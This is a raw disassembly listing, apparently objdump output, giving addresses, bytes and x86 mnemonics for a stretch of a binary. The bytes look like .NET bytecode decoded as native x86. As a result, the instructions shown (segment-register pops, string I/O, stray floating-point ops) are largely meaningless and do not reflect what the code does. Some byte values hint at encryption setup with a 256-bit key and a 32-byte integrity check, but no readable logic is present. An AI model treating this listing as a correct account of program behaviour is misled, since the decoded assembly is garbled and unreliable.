  4041a8:	0a 07                	or     (%edi),%al
  4041aa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4041b0:	d3 00                	roll   %cl,(%eax)
  4041b2:	00 0a                	add    %cl,(%edx)
  4041b4:	07                   	pop    %es
  4041b5:	17                   	pop    %ss
  4041b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b7:	d4 00                	aam    $0x0
  4041b9:	00 0a                	add    %cl,(%edx)
  4041bb:	07                   	pop    %es
  4041bc:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041bf:	00 00                	add    %al,(%eax)
  4041c1:	0a 07                	or     (%edi),%al
  4041c3:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	04 6f                	add    $0x6f,%al
  4041ca:	d6                   	salc
  4041cb:	00 00                	add    %al,(%eax)
  4041cd:	0a 07                	or     (%edi),%al
  4041cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d0:	d7                   	xlat   %ds:(%ebx)
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	0a 06                	or     (%esi),%al
  4041d5:	07                   	pop    %es
  4041d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d7:	d8 00                	fadds  (%eax)
  4041d9:	00 0a                	add    %cl,(%edx)
  4041db:	17                   	pop    %ss
  4041dc:	73 d9                	jae    0x4041b7
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041e3:	07                   	pop    %es
  4041e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e5:	da 00                	fiaddl (%eax)
  4041e7:	00 0a                	add    %cl,(%edx)
  4041e9:	16                   	push   %ss
  4041ea:	07                   	pop    %es
  4041eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ec:	da 00                	fiaddl (%eax)
  4041ee:	00 0a                	add    %cl,(%edx)
  4041f0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041f3:	4c                   	dec    %esp
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 08                	or     (%eax),%cl
  4041f8:	03 16                	add    (%esi),%edx
  4041fa:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404200:	00 0a                	add    %cl,(%edx)
  404202:	08 6f db             	or     %ch,-0x25(%edi)
  404205:	00 00                	add    %al,(%eax)
  404207:	0a 02                	or     (%edx),%al
  404209:	7b 2b                	jnp    0x404236
  40420b:	00 00                	add    %al,(%eax)
  40420d:	04 73                	add    $0x73,%al
  40420f:	dc 00                	faddl  (%eax)
  404211:	00 0a                	add    %cl,(%edx)
  404213:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404218:	00 00                	add    %al,(%eax)
  40421a:	0a 1f                	or     (%edi),%bl
  40421c:	20 06                	and    %al,(%esi)
  40421e:	6f                   	outsl  %ds:(%esi),(%dx)
  40421f:	dd 00                	fldl   (%eax)
  404221:	00 0a                	add    %cl,(%edx)
  404223:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404226:	20 59 6f             	and    %bl,0x6f(%ecx)
  404229:	de 00                	fiadds (%eax)
  40422b:	00 0a                	add    %cl,(%edx)
  40422d:	13 04 06             	adc    (%esi,%eax,1),%eax
  404230:	16                   	push   %ss
  404231:	6a 6f                	push   $0x6f
  404233:	4e                   	dec    %esi
  404234:	00 00                	add    %al,(%eax)
  404236:	0a 06                	or     (%esi),%al
  404238:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40423b:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40423e:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  404245:	27                   	daa
  404246:	00 00                	add    %al,(%eax)
  404248:	00 09                	add    %cl,(%ecx)
  40424a:	39 06                	cmp    %eax,(%esi)
  40424c:	00 00                	add    %al,(%eax)
  40424e:	00 09                	add    %cl,(%ecx)
  404250:	6f                   	outsl  %ds:(%esi),(%dx)
  404251:	33 00                	xor    (%eax),%eax
  404253:	00 0a                	add    %cl,(%edx)
  404255:	dc 08                	fmull  (%eax)
  404257:	39 06                	cmp    %eax,(%esi)
  404259:	00 00                	add    %al,(%eax)
  40425b:	00 08                	add    %cl,(%eax)
  40425d:	6f                   	outsl  %ds:(%esi),(%dx)
  40425e:	33 00                	xor    (%eax),%eax
  404260:	00 0a                	add    %cl,(%edx)
  404262:	dc 07                	faddl  (%edi)
  404264:	39 06                	cmp    %eax,(%esi)
  404266:	00 00                	add    %al,(%eax)
  404268:	00 07                	add    %al,(%edi)
  40426a:	6f                   	outsl  %ds:(%esi),(%dx)
  40426b:	33 00                	xor    (%eax),%eax
  40426d:	00 0a                	add    %cl,(%edx)
  40426f:	dc 06                	faddl  (%esi)
  404271:	6f                   	outsl  %ds:(%esi),(%dx)
  404272:	dd 00                	fldl   (%eax)
  404274:	00 0a                	add    %cl,(%edx)
  404276:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  40427c:	00 06                	add    %al,(%esi)
  40427e:	39 06                	cmp    %eax,(%esi)
  404280:	00 00                	add    %al,(%eax)
  404282:	00 06                	add    %al,(%esi)
  404284:	6f                   	outsl  %ds:(%esi),(%dx)
  404285:	33 00                	xor    (%eax),%eax
  404287:	00 0a                	add    %cl,(%edx)
  404289:	dc 11                	fcoml  (%ecx)
  40428b:	05 2a 00 00 00       	add    $0x2a,%eax
  404290:	01 34 00             	add    %esi,(%eax,%eax,1)
  404293:	00 02                	add    %al,(%edx)
  404295:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  40429c:	00 00                	add    %al,(%eax)
  40429e:	00 00                	add    %al,(%eax)
  4042a0:	02 00                	add    (%eax),%al
  4042a2:	6a 00                	push   $0x0
  4042a4:	74 de                	je     0x404284
  4042a6:	00 0d 00 00 00 00    	add    %cl,0x0
  4042ac:	02 00                	add    (%eax),%al
  4042ae:	26 00 c5             	es add %al,%ch
  4042b1:	eb 00                	jmp    0x4042b3
  4042b3:	0d 00 00 00 00       	or     $0x0,%eax
  4042b8:	02 00                	add    (%eax),%al
  4042ba:	17                   	pop    %ss
  4042bb:	00 ee                	add    %ch,%dh
  4042bd:	05 01 0d 00 00       	add    $0xd01,%eax
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	1b 30                	sbb    (%eax),%esi
  4042c6:	05 00 50 01 00       	add    $0x15000,%eax
  4042cb:	00 17                	add    %dl,(%edi)
  4042cd:	00 00                	add    %al,(%eax)
  4042cf:	11 03                	adc    %eax,(%ebx)
  4042d1:	3a 0b                	cmp    (%ebx),%cl
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	00 72 68             	add    %dh,0x68(%edx)
  4042d8:	27                   	daa
  4042d9:	00 70 73             	add    %dh,0x73(%eax)
  4042dc:	cf                   	iret
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	0a 7a 03             	or     0x3(%edx),%bh
  4042e2:	73 4d                	jae    0x404331
  4042e4:	00 00                	add    %al,(%eax)
  4042e6:	0a 0a                	or     (%edx),%cl
  4042e8:	73 d1                	jae    0x4042bb
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	0a 0b                	or     (%ebx),%cl
  4042ee:	07                   	pop    %es
  4042ef:	20 00                	and    %al,(%eax)
  4042f1:	01 00                	add    %eax,(%eax)
  4042f3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a 07                	or     (%edi),%al
  4042fa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404300:	d3 00                	roll   %cl,(%eax)
  404302:	00 0a                	add    %cl,(%edx)
  404304:	07                   	pop    %es
  404305:	17                   	pop    %ss
  404306:	6f                   	outsl  %ds:(%esi),(%dx)
  404307:	d4 00                	aam    $0x0
  404309:	00 0a                	add    %cl,(%edx)
  40430b:	07                   	pop    %es
  40430c:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  40430f:	00 00                	add    %al,(%eax)
  404311:	0a 07                	or     (%edi),%al
  404313:	02 7b 2a             	add    0x2a(%ebx),%bh
  404316:	00 00                	add    %al,(%eax)
  404318:	04 6f                	add    $0x6f,%al
  40431a:	d6                   	salc
  40431b:	00 00                	add    %al,(%eax)
  40431d:	0a 02                	or     (%edx),%al
  40431f:	7b 2b                	jnp    0x40434c
  404321:	00 00                	add    %al,(%eax)
  404323:	04 73                	add    $0x73,%al
  404325:	dc 00                	faddl  (%eax)
  404327:	00 0a                	add    %cl,(%edx)
  404329:	0c 08                	or     $0x8,%al
  40432b:	06                   	push   %es
  40432c:	6f                   	outsl  %ds:(%esi),(%dx)
  40432d:	dd 00                	fldl   (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	1f                   	pop    %ds
  404332:	20 06                	and    %al,(%esi)
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40433c:	20 59 6f             	and    %bl,0x6f(%ecx)
  40433f:	de 00                	fiadds (%eax)
  404341:	00 0a                	add    %cl,(%edx)
  404343:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404348:	00 00                	add    %al,(%eax)
  40434a:	01 13                	add    %edx,(%ebx)
  40434c:	04 06                	add    $0x6,%al
  40434e:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404351:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404354:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40435b:	02 09                	add    (%ecx),%cl
  40435d:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404360:	50                   	push   %eax
  404361:	00 00                	add    %al,(%eax)
  404363:	06                   	push   %es
  404364:	3a 0b                	cmp    (%ebx),%cl
  404366:	00 00                	add    %al,(%eax)
  404368:	00 72 96             	add    %dh,-0x6a(%edx)
  40436b:	27                   	daa
  40436c:	00 70 73             	add    %dh,0x73(%eax)
  40436f:	df 00                	filds  (%eax)
  404371:	00 0a                	add    %cl,(%edx)
  404373:	7a dd                	jp     0x404352
  404375:	0d 00 00 00 08       	or     $0x8000000,%eax
  40437a:	39 06                	cmp    %eax,(%esi)
  40437c:	00 00                	add    %al,(%eax)
  40437e:	00 08                	add    %cl,(%eax)
  404380:	6f                   	outsl  %ds:(%esi),(%dx)
  404381:	33 00                	xor    (%eax),%eax
  404383:	00 0a                	add    %cl,(%edx)
  404385:	dc 1f                	fcompl (%edi)
  404387:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  40438d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  404393:	1f                   	pop    %ds
  404394:	10 6f 45             	adc    %ch,0x45(%edi)
  404397:	00 00                	add    %al,(%eax)
  404399:	0a 26                	or     (%esi),%ah
  40439b:	07                   	pop    %es
  40439c:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043a2:	0a 06                	or     (%esi),%al
  4043a4:	07                   	pop    %es
  4043a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a6:	e1 00                	loope  0x4043a8
  4043a8:	00 0a                	add    %cl,(%edx)
  4043aa:	16                   	push   %ss
  4043ab:	73 d9                	jae    0x404386
  4043ad:	00 00                	add    %al,(%eax)
  4043af:	0a 13                	or     (%ebx),%dl
  4043b1:	06                   	push   %es
  4043b2:	06                   	push   %es
  4043b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043b4:	e2 00                	loop   0x4043b6
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	1f                   	pop    %ds
  4043b9:	10 6a 59             	adc    %ch,0x59(%edx)
  4043bc:	17                   	pop    %ss
  4043bd:	6a 58                	push   $0x58
  4043bf:	d4 8d                	aam    $0x8d
  4043c1:	44                   	inc    %esp
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	01 13                	add    %edx,(%ebx)
  4043c6:	07                   	pop    %es
  4043c7:	11 06                	adc    %eax,(%esi)
  4043c9:	11 07                	adc    %eax,(%edi)
  4043cb:	16                   	push   %ss
  4043cc:	11 07                	adc    %eax,(%edi)
  4043ce:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d1:	45                   	inc    %ebp
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043da:	13 08                	adc    (%eax),%ecx
  4043dc:	11 07                	adc    %eax,(%edi)
  4043de:	16                   	push   %ss
  4043df:	11 08                	adc    %ecx,(%eax)
  4043e1:	16                   	push   %ss
  4043e2:	11 08                	adc    %ecx,(%eax)
  4043e4:	8e 69 28             	mov    0x28(%ecx),%gs
  4043e7:	e3 00                	jecxz  0x4043e9
  4043e9:	00 0a                	add    %cl,(%edx)
  4043eb:	11 08                	adc    %ecx,(%eax)
  4043ed:	13 09                	adc    (%ecx),%ecx
  4043ef:	dd 29                	(bad) (%ecx)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 11                	add    %dl,(%ecx)
  4043f5:	06                   	push   %es
  4043f6:	39 07                	cmp    %eax,(%edi)
  4043f8:	00 00                	add    %al,(%eax)
  4043fa:	00 11                	add    %dl,(%ecx)
  4043fc:	06                   	push   %es
  4043fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4043fe:	33 00                	xor    (%eax),%eax
  404400:	00 0a                	add    %cl,(%edx)
  404402:	dc 07                	faddl  (%edi)
  404404:	39 06                	cmp    %eax,(%esi)
  404406:	00 00                	add    %al,(%eax)
  404408:	00 07                	add    %al,(%edi)
  40440a:	6f                   	outsl  %ds:(%esi),(%dx)
  40440b:	33 00                	xor    (%eax),%eax
  40440d:	00 0a                	add    %cl,(%edx)
  40440f:	dc 06                	faddl  (%esi)
  404411:	39 06                	cmp    %eax,(%esi)
  404413:	00 00                	add    %al,(%eax)
  404415:	00 06                	add    %al,(%esi)
  404417:	6f                   	outsl  %ds:(%esi),(%dx)
  404418:	33 00                	xor    (%eax),%eax
  40441a:	00 0a                	add    %cl,(%edx)
  40441c:	dc 11                	fcoml  (%ecx)
  40441e:	09 2a                	or     %ebp,(%edx)
  404420:	41                   	inc    %ecx
  404421:	64 00 00             	add    %al,%fs:(%eax)
  404424:	02 00                	add    (%eax),%al
  404426:	00 00                	add    %al,(%eax)
  404428:	5a                   	pop    %edx
  404429:	00 00                	add    %al,(%eax)
  40442b:	00 4f 00             	add    %cl,0x0(%edi)
  40442e:	00 00                	add    %al,(%eax)
  404430:	a9 00 00 00 0d       	test   $0xd000000,%eax
  404435:	00 00                	add    %al,(%eax)
  404437:	00 00                	add    %al,(%eax)
  404439:	00 00                	add    %al,(%eax)
  40443b:	00 02                	add    %al,(%edx)
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 e2                	add    %ah,%dl
  404441:	00 00                	add    %al,(%eax)
  404443:	00 42 00             	add    %al,0x0(%edx)
  404446:	00 00                	add    %al,(%eax)
  404448:	24 01                	and    $0x1,%al
  40444a:	00 00                	add    %al,(%eax)
  40444c:	0f 00 00             	sldt   (%eax)
  40444f:	00 00                	add    %al,(%eax)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 02                	add    %al,(%edx)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 1e                	add    %bl,(%esi)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 15 01 00 00 33    	add    %dl,0x33000001
  404461:	01 00                	add    %eax,(%eax)
  404463:	00 0d 00 00 00 00    	add    %cl,0x0
  404469:	00 00                	add    %al,(%eax)
  40446b:	00 02                	add    %al,(%edx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	00 18                	add    %bl,(%eax)
  404471:	00 00                	add    %al,(%eax)
  404473:	00 28                	add    %ch,(%eax)
  404475:	01 00                	add    %eax,(%eax)
  404477:	00 40 01             	add    %al,0x1(%eax)
  40447a:	00 00                	add    %al,(%eax)
  40447c:	0d 00 00 00 00       	or     $0x0,%eax
  404481:	00 00                	add    %al,(%eax)
  404483:	00 13                	add    %dl,(%ebx)
  404485:	30 03                	xor    %al,(%ebx)
  404487:	00 22                	add    %ah,(%edx)
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 18                	add    %bl,(%eax)
  40448d:	00 00                	add    %al,(%eax)
  40448f:	11 17                	adc    %edx,(%edi)
  404491:	0a 16                	or     (%esi),%dl
  404493:	0b 38                	or     (%eax),%edi
  404495:	11 00                	adc    %eax,(%eax)
  404497:	00 00                	add    %al,(%eax)
  404499:	03 07                	add    (%edi),%eax
  40449b:	91                   	xchg   %eax,%ecx
  40449c:	04 07                	add    $0x7,%al
  40449e:	91                   	xchg   %eax,%ecx
  40449f:	3b 02                	cmp    (%edx),%eax
  4044a1:	00 00                	add    %al,(%eax)
  4044a3:	00 16                	add    %dl,(%esi)
  4044a5:	0a 07                	or     (%edi),%al
  4044a7:	17                   	pop    %ss
  4044a8:	58                   	pop    %eax
  4044a9:	0b 07                	or     (%edi),%eax
  4044ab:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b1:	2a 00                	sub    (%eax),%al
  4044b3:	00 1b                	add    %bl,(%ebx)
  4044b5:	30 03                	xor    %al,(%ebx)
  4044b7:	00 6e 00             	add    %ch,0x0(%esi)
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	19 00                	sbb    %eax,(%eax)
  4044be:	00 11                	add    %dl,(%ecx)
  4044c0:	28 19                	sub    %bl,(%ecx)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	0a 02                	or     (%edx),%al
  4044c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044c7:	1f                   	pop    %ds
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	0a 0a                	or     (%edx),%cl
  4044cc:	73 e5                	jae    0x4044b3
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	0a 0b                	or     (%ebx),%cl
  4044d2:	07                   	pop    %es
  4044d3:	06                   	push   %es
  4044d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044d5:	8f 00                	pop    (%eax)
  4044d7:	00 0a                	add    %cl,(%edx)
  4044d9:	0a dd                	or     %ch,%bl
  4044db:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e0:	39 06                	cmp    %eax,(%esi)
  4044e2:	00 00                	add    %al,(%eax)
  4044e4:	00 07                	add    %al,(%edi)
  4044e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e7:	33 00                	xor    (%eax),%eax
  4044e9:	00 0a                	add    %cl,(%edx)
  4044eb:	dc 73 90             	fdivl  -0x70(%ebx)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044f3:	0d 16 13 04 38       	or     $0x38041316,%eax
  4044f8:	1f                   	pop    %ds
  4044f9:	00 00                	add    %al,(%eax)
  4044fb:	00 09                	add    %cl,(%ecx)
  4044fd:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404500:	13 05 08 12 05 72    	adc    0x72051208,%eax
  404506:	ec                   	in     (%dx),%al
  404507:	27                   	daa
  404508:	00 70 28             	add    %dh,0x28(%eax)
  40450b:	91                   	xchg   %eax,%ecx
  40450c:	00 00                	add    %al,(%eax)
  40450e:	0a 6f 92             	or     -0x6e(%edi),%ch
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 26                	or     (%esi),%ah
  404515:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404518:	58                   	pop    %eax
  404519:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40451c:	04 09                	add    $0x9,%al
  40451e:	8e 69 32             	mov    0x32(%ecx),%gs
  404521:	da 08                	fimull (%eax)
  404523:	6f                   	outsl  %ds:(%esi),(%dx)
  404524:	38 00                	cmp    %al,(%eax)
  404526:	00 0a                	add    %cl,(%edx)
  404528:	6f                   	outsl  %ds:(%esi),(%dx)
  404529:	94                   	xchg   %eax,%esp
  40452a:	00 00                	add    %al,(%eax)
  40452c:	0a 2a                	or     (%edx),%ch
  40452e:	00 00                	add    %al,(%eax)
  404530:	01 10                	add    %edx,(%eax)
  404532:	00 00                	add    %al,(%eax)
  404534:	02 00                	add    (%eax),%al
  404536:	12 00                	adc    (%eax),%al
  404538:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  40453d:	00 00                	add    %al,(%eax)
  40453f:	00 1b                	add    %bl,(%ebx)
  404541:	30 02                	xor    %al,(%edx)
  404543:	00 22                	add    %ah,(%edx)
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1a                	add    %bl,(%edx)
  404549:	00 00                	add    %al,(%eax)
  40454b:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  40454e:	00 00                	add    %al,(%eax)
  404550:	0a 0a                	or     (%edx),%cl
  404552:	06                   	push   %es
  404553:	02 6f 8f             	add    -0x71(%edi),%ch
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0b                	or     (%ebx),%cl
  40455a:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404560:	39 06                	cmp    %eax,(%esi)
  404562:	00 00                	add    %al,(%eax)
  404564:	00 06                	add    %al,(%esi)
  404566:	6f                   	outsl  %ds:(%esi),(%dx)
  404567:	33 00                	xor    (%eax),%eax
  404569:	00 0a                	add    %cl,(%edx)
  40456b:	dc 07                	faddl  (%edi)
  40456d:	2a 00                	sub    (%eax),%al
  40456f:	00 01                	add    %al,(%ecx)
  404571:	10 00                	adc    %al,(%eax)
  404573:	00 02                	add    %al,(%edx)
  404575:	00 06                	add    %al,(%esi)
  404577:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  40457d:	00 00                	add    %al,(%eax)
  40457f:	00 13                	add    %dl,(%ebx)
  404581:	30 03                	xor    %al,(%ebx)
  404583:	00 3b                	add    %bh,(%ebx)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 1b                	add    %bl,(%ebx)
  404589:	00 00                	add    %al,(%eax)
  40458b:	11 73 90             	adc    %esi,-0x70(%ebx)
  40458e:	00 00                	add    %al,(%eax)
  404590:	0a 0a                	or     (%edx),%cl
  404592:	02 0b                	add    (%ebx),%cl
  404594:	16                   	push   %ss
  404595:	0c 38                	or     $0x38,%al
  404597:	1f                   	pop    %ds
  404598:	00 00                	add    %al,(%eax)
  40459a:	00 07                	add    %al,(%edi)
  40459c:	08 91 0d 06 72 f2    	or     %dl,-0xd8df9f3(%ecx)
  4045a2:	27                   	daa
  4045a3:	00 70 09             	add    %dh,0x9(%eax)
  4045a6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045aa:	01 28                	add    %ebp,(%eax)
  4045ac:	e6 00                	out    %al,$0x0
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b1:	92                   	xchg   %eax,%edx
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	0a 26                	or     (%esi),%ah
  4045b6:	08 17                	or     %dl,(%edi)
  4045b8:	58                   	pop    %eax
  4045b9:	0c 08                	or     $0x8,%al
  4045bb:	07                   	pop    %es
  4045bc:	8e 69 32             	mov    0x32(%ecx),%gs
  4045bf:	db 06                	fildl  (%esi)
  4045c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c2:	38 00                	cmp    %al,(%eax)
  4045c4:	00 0a                	add    %cl,(%edx)
  4045c6:	2a 00                	sub    (%eax),%al
  4045c8:	13 30                	adc    (%eax),%esi
  4045ca:	03 00                	add    (%eax),%eax
  4045cc:	3b 00                	cmp    (%eax),%eax
  4045ce:	00 00                	add    %al,(%eax)
  4045d0:	1b 00                	sbb    (%eax),%eax
  4045d2:	00 11                	add    %dl,(%ecx)
  4045d4:	73 90                	jae    0x404566
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	0a 0a                	or     (%edx),%cl
  4045da:	02 0b                	add    (%ebx),%cl
  4045dc:	16                   	push   %ss
  4045dd:	0c 38                	or     $0x38,%al
  4045df:	1f                   	pop    %ds
  4045e0:	00 00                	add    %al,(%eax)
  4045e2:	00 07                	add    %al,(%edi)
  4045e4:	08 91 0d 06 72 02    	or     %dl,0x272060d(%ecx)
  4045ea:	28 00                	sub    %al,(%eax)
  4045ec:	70 09                	jo     0x4045f7
  4045ee:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045f2:	01 28                	add    %ebp,(%eax)
  4045f4:	e6 00                	out    %al,$0x0
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f9:	92                   	xchg   %eax,%edx
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	0a 26                	or     (%esi),%ah
  4045fe:	08 17                	or     %dl,(%edi)
  404600:	58                   	pop    %eax
  404601:	0c 08                	or     $0x8,%al
  404603:	07                   	pop    %es
  404604:	8e 69 32             	mov    0x32(%ecx),%gs
  404607:	db 06                	fildl  (%esi)
  404609:	6f                   	outsl  %ds:(%esi),(%dx)
  40460a:	38 00                	cmp    %al,(%eax)
  40460c:	00 0a                	add    %cl,(%edx)
  40460e:	2a 00                	sub    (%eax),%al
  404610:	13 30                	adc    (%eax),%esi
  404612:	04 00                	add    $0x0,%al
  404614:	2c 00                	sub    $0x0,%al
  404616:	00 00                	add    %al,(%eax)
  404618:	1c 00                	sbb    $0x0,%al
  40461a:	00 11                	add    %dl,(%ecx)
  40461c:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  404622:	00 01                	add    %al,(%ecx)
  404624:	0a 02                	or     (%edx),%al
  404626:	8e 69 17             	mov    0x17(%ecx),%gs
  404629:	59                   	pop    %ecx
  40462a:	0b 16                	or     (%esi),%edx
  40462c:	0c 38                	or     $0x38,%al
  40462e:	0e                   	push   %cs
  40462f:	00 00                	add    %al,(%eax)
  404631:	00 06                	add    %al,(%esi)
  404633:	08 02                	or     %al,(%edx)
  404635:	07                   	pop    %es
  404636:	91                   	xchg   %eax,%ecx
  404637:	9c                   	pushf
  404638:	07                   	pop    %es
  404639:	17                   	pop    %ss
  40463a:	59                   	pop    %ecx
  40463b:	0b 08                	or     (%eax),%ecx
  40463d:	17                   	pop    %ss
  40463e:	58                   	pop    %eax
  40463f:	0c 08                	or     $0x8,%al
  404641:	06                   	push   %es
  404642:	8e 69 32             	mov    0x32(%ecx),%gs
  404645:	ec                   	in     (%dx),%al
  404646:	06                   	push   %es
  404647:	2a 13                	sub    (%ebx),%dl
  404649:	30 02                	xor    %al,(%edx)
  40464b:	00 36                	add    %dh,(%esi)
  40464d:	00 00                	add    %al,(%eax)
  40464f:	00 01                	add    %al,(%ecx)
  404651:	00 00                	add    %al,(%eax)
  404653:	11 16                	adc    %edx,(%esi)
  404655:	0a 38                	or     (%eax),%bh
  404657:	15 00 00 00 02       	adc    $0x2000000,%eax
  40465c:	7b 38                	jnp    0x404696
  40465e:	00 00                	add    %al,(%eax)
  404660:	04 06                	add    $0x6,%al
  404662:	6f                   	outsl  %ds:(%esi),(%dx)
  404663:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  40466a:	00 06                	add    %al,(%esi)
  40466c:	06                   	push   %es
  40466d:	17                   	pop    %ss
  40466e:	58                   	pop    %eax
  40466f:	0a 06                	or     (%esi),%al
  404671:	02 7b 38             	add    0x38(%ebx),%bh
  404674:	00 00                	add    %al,(%eax)
  404676:	04 6f                	add    $0x6f,%al
  404678:	eb 00                	jmp    0x40467a
  40467a:	00 0a                	add    %cl,(%edx)
  40467c:	32 dd                	xor    %ch,%bl
  40467e:	02 7b 38             	add    0x38(%ebx),%bh
  404681:	00 00                	add    %al,(%eax)
  404683:	04 6f                	add    $0x6f,%al
  404685:	ec                   	in     (%dx),%al
  404686:	00 00                	add    %al,(%eax)
  404688:	0a 2a                	or     (%edx),%ch
  40468a:	00 00                	add    %al,(%eax)
  40468c:	13 30                	adc    (%eax),%esi
  40468e:	02 00                	add    (%eax),%al
  404690:	1b 00                	sbb    (%eax),%eax
  404692:	00 00                	add    %al,(%eax)
  404694:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  404699:	94                   	xchg   %eax,%esp
  40469a:	00 00                	add    %al,(%eax)
  40469c:	06                   	push   %es
  40469d:	0a 06                	or     (%esi),%al
  40469f:	02 7d 37             	add    0x37(%ebp),%bh
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	04 02                	add    $0x2,%al
  4046a6:	7b 38                	jnp    0x4046e0
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	04 06                	add    $0x6,%al
  4046ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ad:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046b2:	2a 00                	sub    (%eax),%al
  4046b4:	1b 30                	sbb    (%eax),%esi
  4046b6:	02 00                	add    (%eax),%al
  4046b8:	60                   	pusha
  4046b9:	00 00                	add    %al,(%eax)
  4046bb:	00 1e                	add    %bl,(%esi)
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4046c6:	7d 00                	jge    0x4046c8
  4046c8:	00 0a                	add    %cl,(%edx)
  4046ca:	0c 02                	or     $0x2,%al
  4046cc:	7b 38                	jnp    0x404706
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	04 6f                	add    $0x6f,%al
  4046d2:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046d7:	38 26                	cmp    %ah,(%esi)
  4046d9:	00 00                	add    %al,(%eax)
  4046db:	00 12                	add    %dl,(%edx)
  4046dd:	03 28                	add    (%eax),%ebp
  4046df:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046e4:	04 06                	add    $0x6,%al
  4046e6:	17                   	pop    %ss
